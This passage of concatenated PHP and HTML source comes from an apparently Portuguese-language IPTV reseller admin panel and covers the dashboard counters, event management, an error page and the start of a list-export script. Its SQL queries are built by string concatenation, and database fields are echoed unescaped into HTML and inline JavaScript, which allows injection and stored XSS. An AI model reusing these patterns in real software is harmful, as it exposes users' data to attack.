           $("#s").append(clone);
	   $('#exdiaE').hide();
	   $('#CreditoE').hide();
	   $('#ConectadoE').hide();
       } else {
           $('#adminE').val(0);
           $('#vendedorE').val(0);
           $("#s").append(clone);
	   $('#exdiaE').show();
	   $('#CreditoE').show();
	   $('#ConectadoE').show();
       }
    });
    if(window.mobilecheck()){
	$('#checkme').remove();
    }
    $('.thead-light th:not(".nomecol")').remove();
</script>
<?php require_once("comum.php"); 
require_once("alerta.php");?>

</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/comum.php:
<script>
    $(document).ready(function() {
    $(".pesquisar").keyup(function () {
        var termoBusca = $(".pesquisar").val();
        var listaItem = $('#conteudo').children('tr');
        var splitPesquisa = termoBusca.replace(/ /g, "'):containsi('");
        
        $.extend($.expr[':'], {
            'containsi': function(elem, i, match, array){
                return (elem.innerText.replace("Editar","").replace("Remover","") || '').toLowerCase().indexOf((match[3] || "").toLowerCase()) >= 0;
            }
        });
        $("#conteudo tr").not(":containsi('" + splitPesquisa + "')").each(function(e){
            $(this).attr('visible','false');
        });
        $("#conteudo tr:containsi('" + splitPesquisa + "')").each(function(e){
            $(this).attr('visible','true');
        });
        var nAchados = $('#conteudo tr[visible="true"]').length;
        if(nAchados == '0') {
            $('.semresultado').show();
            $('.nomecol').hide();
        } else {
            $('.semresultado').hide();
            $('.nomecol').show();
        }  
    });
  });

    function resultado(data) {
        $("#textoAlerta").text(data);
        $("#alerta").modal();
    }
</script>
dashboard.php:
<?php
session_start();
include("controles/conexao.php");
require_once("controles/usuarios.php");
require_once("controles/novidades.php");
require_once("controles/listas.php");
require_once("controles/categorias.php");
if (checarUsuario()) {
require_once("cabecalho.php");
$novidades = listarNovidades();
$buscar = "SELECT * FROM usuario WHERE id_usuario = ".$_SESSION['id_usuario']."";
$resut = mysqli_query($conexao, $buscar);
while($usuario = mysqli_fetch_array($resut)){
?>
<link rel="stylesheet" type="text/css" href="css/dashboard.min.css" />
<link rel="stylesheet" type="text/css" href="css/dashboard.css" />

<style>
	.btn:focus, .btn::-moz-focus-inner{
	  outline:none;
	  border:none;
	}
	.btn{
	  font-family: arial;
	  font-size:14px;
	  font-weight:700;
	  border:none;
	  padding:10px;
	  cursor: pointer;
	  display:inline-block;
	  text-decoration: none;
	}
	.btn-green{
	  background:green;
	  color:#fff;
	  box-shadow:0 5px 0 #006000;
	}
	.btn-green:hover{
	  background:#006000;
	  color:#fff;
	  box-shadow:0 5px 0 #003f00;
	}
	a:link
	{
	text-decoration:none;
	}
</style>

<body class="layout-boxed sidebar-mini">
	<header class="navbar navbar-expand-lg navbar-dark bg-dark">
	<a class="navbar-brand" href="#" id="logoTopo"><b>Dashboard</b></a>
	</header>
		<?php if($_SESSION['admin']) { ?>
			<div class="wrapper">
				<section class="content">
					<div class="row">
						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="cliente.php">
								<div class="info-box">
										<span class="info-box-icon bg-aqua"><i class="fas fa-users"></i></span>
									<div class="info-box-content">
										<span class="info-box-text">Clientes<br>Cadastrados</span>
										<span class="info-box-number">
											<?php

											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE vendedor = 0 AND admin = 0 AND dia = 31");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
									</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="cliente.php">
								<div class="info-box">
									<span class="info-box-icon bg-green"><i class="fas fa-user-check"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Clientes<br>Ativos</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE estado_usuario = 1 AND vendedor = 0 AND admin = 0 AND dia = 31");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="cliente.php">
								<div class="info-box">
									<span class="info-box-icon bg-red"><i class="fas fa-user-times"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Clientes<br>Bloqueados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE estado_usuario = 0  AND vendedor = 0 AND admin = 0 AND dia = 31");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="usuario.php">
								<div class="info-box">
									<span class="info-box-icon bg-blue"><i class="fas fa-user-tag"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Vendedores<br>Cadastrados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE vendedor = 1 AND admin = 0 AND dia = 0");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="usuario.php">
								<div class="info-box">
									<span class="info-box-icon bg-red"><i class="fas fa-user-lock"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Vendedores<br>Bloqueados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE estado_usuario = 0 AND vendedor = 1 AND admin = 0 AND dia = 0");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="link.php">
								<div class="info-box">
									<span class="info-box-icon bg-orange"><i class="fas fa-video"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Total<br>Conteúdos</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM link");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="categoria.php">
								<div class="info-box">
									<span class="info-box-icon bg-purple"><i class="fas fa-list"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Categorías</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM categoria");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="lista.php">
								<div class="info-box">
									<span class="info-box-icon bg-yellow"><i class="fas fa-archive"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Listas</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM lista");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="administrador.php">
								<div class="info-box">
									<span class="info-box-icon bg-teal"><i class="fas fa-user-cog"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Administradores<br>Cadastrados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE vendedor = 0 AND admin = 1 AND dia = 0");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="teste.php">
								<div class="info-box">
									<span class="info-box-icon bg-green"><i class="fas fa-users"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Testes<br>Cadastrados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE vendedor = 0 AND admin = 0 AND dia = 1");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="mensagens.php">
								<div class="info-box">
									<span class="info-box-icon bg-maroon"><i class="far fa-envelope"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Mensagens</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM mensagens order by id_mensagem");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>
						
						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="#">
								<div class="info-box">
									<span class="info-box-icon bg-navy"><i class="far fa-calendar-alt"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Eventos</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM eventos order by id_evento");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>
							</a>
						</div>
				</section>
			</div>
		<br />
		<?php } ?>

        <?php if ($usuario['master'] == 1) { ?>	
		<?php if($_SESSION['vendedor']) { ?>
			<div class="wrapper">
				<section class="content">
					<div class="row">
						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="cliente.php">
								<div class="info-box">
										<span class="info-box-icon bg-aqua"><i class="fas fa-users"></i></span>
									<div class="info-box-content">
										<span class="info-box-text">Clientes<br>Cadastrados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND vendedor = 0 AND admin = 0 AND dia = 31");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
									</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="cliente.php">
								<div class="info-box">
									<span class="info-box-icon bg-green"><i class="fas fa-user-check"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Clientes<br>Ativos</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND estado_usuario = 1 AND vendedor = 0 AND admin = 0 AND dia = 31");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="cliente.php">
								<div class="info-box">
									<span class="info-box-icon bg-red"><i class="fas fa-user-times"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Clientes<br>Bloqueados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND estado_usuario = 0  AND vendedor = 0 AND admin = 0 AND dia = 31");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="usuario.php">
								<div class="info-box">
									<span class="info-box-icon bg-blue"><i class="fas fa-user-tag"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Vendedores<br>Cadastrados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND vendedor = 1 AND admin = 0 AND dia = 0");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="usuario.php">
								<div class="info-box">
									<span class="info-box-icon bg-red"><i class="fas fa-user-lock"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Vendedores<br>Bloqueados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND estado_usuario = 0 AND vendedor = 1 AND admin = 0 AND dia = 0");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>
						
						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="#">
								<div class="info-box">
									<span class="info-box-icon bg-orange"><i class="fas fa-video"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Total<br>Conteúdos</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM link");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="teste.php">
								<div class="info-box">
								<span class="info-box-icon bg-maroon"><i class="fas fa-users"></i></span>									
								<div class="info-box-content">
									<span class="info-box-text">Testes<br>Cadastrados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND vendedor = 0 AND admin = 0 AND dia = 1");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>
						
						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="teste.php">
								<div class="info-box">
									<span class="info-box-icon bg-navy"><i class="fas fa-user-times"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Testes<br>Bloqueados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND estado_usuario = 0  AND vendedor = 0 AND admin = 0 AND dia = 1");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>
				</section>
			</div>
		<br />
		<?php } ?>
		<?php } ?>

        <?php if ($usuario['master'] == 0) { ?>	
		<?php if($_SESSION['vendedor']) { ?>
			<div class="wrapper">
				<section class="content">
					<div class="row">
						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="cliente.php">
								<div class="info-box">
										<span class="info-box-icon bg-aqua"><i class="fas fa-users"></i></span>
									<div class="info-box-content">
										<span class="info-box-text">Clientes<br>Cadastrados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND vendedor = 0 AND admin = 0 AND dia = 31");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
									</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="cliente.php">
								<div class="info-box">
									<span class="info-box-icon bg-green"><i class="fas fa-user-check"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Clientes<br>Ativos</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND estado_usuario = 1 AND vendedor = 0 AND admin = 0 AND dia = 31");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="cliente.php">
								<div class="info-box">
									<span class="info-box-icon bg-red"><i class="fas fa-user-times"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Clientes<br>Bloqueados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND estado_usuario = 0  AND vendedor = 0 AND admin = 0 AND dia = 31");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="#">
								<div class="info-box">
									<span class="info-box-icon bg-orange"><i class="fas fa-video"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Total<br>Conteúdos</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM link");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>

						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="teste.php">
								<div class="info-box">
								<span class="info-box-icon bg-maroon"><i class="fas fa-users"></i></span>									
								<div class="info-box-content">
									<span class="info-box-text">Testes<br>Cadastrados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND vendedor = 0 AND admin = 0 AND dia = 1");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>
						
						<div class="col-md-3 col-sm-6 col-xs-12">
							<a href="teste.php">
								<div class="info-box">
									<span class="info-box-icon bg-navy"><i class="fas fa-user-times"></i></span>
								<div class="info-box-content">
									<span class="info-box-text">Testes<br>Bloqueados</span>
										<span class="info-box-number">
											<?php
											
											//BUSCAR USUARIO
											$buscarusuario = ("SELECT * FROM usuario WHERE id_criador = ". $_SESSION['id_usuario']." AND estado_usuario = 0  AND vendedor = 0 AND admin = 0 AND dia = 1");

											//PEGAR QUANTIDADE
											$result = mysqli_query($conexao, $buscarusuario);

											//MOSTRAR QUANTIDADE
											echo mysqli_num_rows($result);
											?>
										</span>
								</div>
								</div>
							</a>
						</div>
				</section>
			</div>
		<br />
		<?php } ?>
		<?php } ?>
		
<div class="row" style="height: auto;">
	<div class="col-md-6" style="height: auto;">
		<div class="panel panel-default StatusBodyOP" style="height: auto;">
			<div class="panel-body" style="height: auto;">
				<div class="panel-heading">
					<h3 align="center" class="panel-title">Últimos Adicionados</h3>
				</div>
				<span id="StatusOperadora" style="height: auto;">
					
					<table class="table table-striped">
						
						<thead>
							<tr>
								<th><center>Logotipo:</center></th>
								<th><center>Nome:</center></th>
							</tr>
						</thead>
						
						<tbody>
							<?php foreach($novidades as $novidade) { ?>
								<tr>
									<td style="vertical-align: middle;"><center> <?php echo '<img src="'.$novidade['logo'].'" width="30px" height="30px"/>'?> </center></td>
									<td style="vertical-align: middle;"><center> <?=$novidade['nome_link']?> </center></td>
								</tr>
							<?php } ?>
						</tbody>
					
					</table>
				</span>
			</div>                       
		</div>                        
	</div>

<?php if($_SESSION['vendedor']) { ?>
<div class="col-md-6" style="height: auto;">
		<div class="panel panel-default StatusBodyOP" style="height: auto;">
			<div class="panel-body" style="height: auto;">
				<div class="panel-heading">
					<h3 align="center" class="panel-title">Últimos Acessos</h3>
				</div>
				<span id="StatusOperadora" style="height: auto;">
					
					<table class="table table-striped">
						
						<thead>
							<tr>
								<th><center>Logotipo:</center></th>
								<th><center>Nome:</center></th>
								<th><center>Data e Hora:</center></th>
							</tr>
						</thead>
						
						<tbody>
    						<?php
							$usuario = "SELECT * FROM usuario WHERE id_criador = ".$_SESSION['id_usuario']."";
							$resut = mysqli_query($conexao, $usuario);
							while($usuario = mysqli_fetch_array($resut)){
							
							$logs = "SELECT * FROM logs WHERE id_usuario = ".$usuario['id_usuario']." limit 5";
							$resut = mysqli_query($conexao, $logs);
							while($log = mysqli_fetch_array($resut)){
							?>
								<tr>
							<?php 
							echo "<td style='vertical-align: middle;'><center> <img src='".$log['logo']."' width='30px' height='30px'/> </center></td>
							<td style='vertical-align: middle;'><center> ".$log['nome']." </center></td>
							<td style='vertical-align: middle;'><center> ".$log['data']." </center></td>";}}
							?>
								</tr>
						</tbody>
					</table>
				</span>
			</div>                       
		</div>                        
	</div>
</div>
<?php } ?>

<?php if($_SESSION['admin']) { ?>
<div class="col-md-6" style="height: auto;">
		<div class="panel panel-default StatusBodyOP" style="height: auto;">
			<div class="panel-body" style="height: auto;">
				<div class="panel-heading">
					<h3 align="center" class="panel-title">Últimos Acessos</h3>
				</div>
				<span id="StatusOperadora" style="height: auto;">
					
					<table class="table table-striped">
						
						<thead>
							<tr>
								<th><center>Logotipo:</center></th>
								<th><center>Nome:</center></th>
								<th><center>Data e Hora:</center></th>
							</tr>
						</thead>
						
						<tbody>
    						<?php
							$conexao = mysqli_query($conexao, "SELECT * FROM logs order by id_log DESC limit 5") or die( 
							mysqli_error($conexao)
							);
							while($log = mysqli_fetch_assoc($conexao)) { 
							?>
								<tr>
							<?php 
							echo "<td style='vertical-align: middle;'><center> <img src='".$log['logo']."' width='30px' height='30px'/> </center></td>
							<td style='vertical-align: middle;'><center> ".$log['nome']." </center></td>
						    <td style='vertical-align: middle;'><center> ".$log['data']." </center></td>";} 
							?>
								</tr>
						</tbody>
					</table>
				</span>
			</div>                       
		</div>                        
	</div>
</div>
<?php } ?>
<?php } ?>

<?php require_once("comum.php");
require_once("alerta.php"); ?>

<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/erro.php:
<!DOCTYPE html>

<html lang="pt-BR">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="icon" href="favicon.ico" type="image/x-icon" />
    <title>ERRO Painel | Xtream Serve</title>
	<style>
        html, body {
            background-color: #000;
            color: #B22222;
            font-family: 'Nunito Sans', sans-serif;
            font-weight: 300;
            height: 100vh;
            margin: 0;
        }

        .full-height {
            height: 100vh;
        }

        .flex-center {
            align-items: center;
            display: flex;
            justify-content: center;
        }

        .position-ref {
            position: relative;
        }

        .top-right {
            position: absolute;
            right: 10px;
            top: 18px;
        }

        .content {
            text-align: center;
            font-size: 18px;
        }

        .title {
            font-family: 'Nunito', sans-serif;
            font-size: 50px;
            font-weight: 700;
            line-height: 1.1;
        }

        .links > a {
            color: #00FF00;
            padding: 0 25px;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: .1rem;
            text-decoration: none;
            text-transform: uppercase;
        }

        .m-b-md {
            margin-bottom: 30px;
        }
    </style>
</head>
<body>
    <div class='flex-center position-ref full-height'>
        <div class='content'>
            <div class='title m-b-md'>
               <img class="mx-auto d-block mb-4" src="img/logo.png" alt="Logo"><br>
			   <span style='font-size:25px;'>Erro na Configuração do Painel</span>
			   </div>
			   <span style='font-size:20px;'>vai até a pasta controles do seu painel edite o arquivo conexao.php</span>
            </div>
        </div>
    </div>
</body>
</html>
/eventos.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/eventos.php");
if (checarUsuario()) {
require_once("cabecalho.php");
$eventos = false;
if($_SESSION['admin']){
    $eventos = listarEventos();
}
?>
<style id="checkme">
	.page-2content {
	    padding-left: 240px !important;
		padding-right: 240px !important;
	}
	</style>
        <div id="conteudo-painel" class="container">
<?php if ($eventos) { ?>
                <div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>
                <table class='table table-bordered table-hover'>
                    <caption>Eventos</caption>
                    <thead class="thead-light">
                        <tr align="center">
                            <th class='nomecol' style="width: 90%" scope="col" >Nome</th>
                            <th class='nomecol' style="width: 5%" scope="col"></th>
                            <th class='nomecol' style="width: 5%" scope="col"></th>
                            <th class='semresultado' scope='col'>Nenhum resultado</th>
                        </tr>
                    </thead>
                <tbody id="conteudo">
<?php foreach($eventos as $evento) { ?>
                        <tr align="center">
                            <td> <?=$evento['nome']?> </td>
                            <td>
                                <button class='btn btn-outline-danger' onclick="removerConfirma('<?=$evento['id_evento']?>','<?=$evento['nome']?>')"><i class="far fa-trash-alt"></i></button>
                            </td>
                            <td>
                                <button class='btn btn-outline-secondary' onclick="editarConfirma('<?=$evento['id_evento']?>','<?=$evento['nome']?>')"><i class="fas fa-edit"></i></button>
                            </td>
                        </tr>
<?php } ?>
                    </tbody>
                </table>
        <?php
        }
        ?>
            <div class="h3 mt-5 row align-items-center justify-content-center">
                <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-plus"></i>
            </div>
        </div>
    </div>

  </main>
  <!-- page-content" -->
</div>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Adicionar Evento</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome" required autofocus>
                </div>
                <button type="submit" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<!-- Edita Inicio -->
<div class="modal fade" id="editar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Evento</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form">
            <div class="container">
                <input type="hidden" id="idE" name="id">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" id="nomeE" name="nome" placeholder="Nome" required autofocus>
                </div>
                <button type="submit" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Edita Fim-->
</body>
<script>
    function removerConfirma(id,nome) {
        $('#remover-conteudo').html('<div class="alert alert-danger" role="alert"><strong> Remover </strong>' + nome + '?</div><button onclick="remover(' + id + ')" type="submit" class="btn btn-danger float-right">Remover</button>');
        $('#remover').modal();
    }

    function editarConfirma(id,nome) {
        $('#idE').val(id);
        $('#nomeE').val(nome);
        $('#editar').modal();
    }

    function remover(id) {
        $.ajax({
            type: "POST",
            url: "controles/remover-evento.php",
            data: {id: id},
            success: function(data) {
                location.reload();
            }
        });
    }

    $( "#cadastro-form" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/adicionar-evento.php",
            data: $("#cadastro-form").serialize(),
            success: function(data) {
                location.reload();
            },
            error: function(data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

    $( "#editar-form" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/editar-evento.php",
            data: $("#editar-form").serialize(),
            success: function(data) {
                location.reload();
            },
            error: function(data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

</script>
<?php require_once("comum.php");
require_once("alerta.php"); ?>
</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/exibir.php:
<?php
require_once('controles/usuarios.php');
require_once('controles/categorias.php');
require_once('controles/listas.php');

if ($_GET["tipo"] == "m3u_plus") {$tipo = "1";} else {$tipo = "2";}
if (isset($_GET["usuario"]) && isset($_GET["lista"])) {
    $tipo1 = $tipo;
    $tipo2 = "1";
    $usuario = $_GET["usuario"];
    $idlista = $_GET["lista"];
	
    if ($usuario !== "" && $idlista !== "") {
        $lista = acessoLista($usuario, $idlista);
        if ($lista) {
            if ($lista['global'] == 0) {
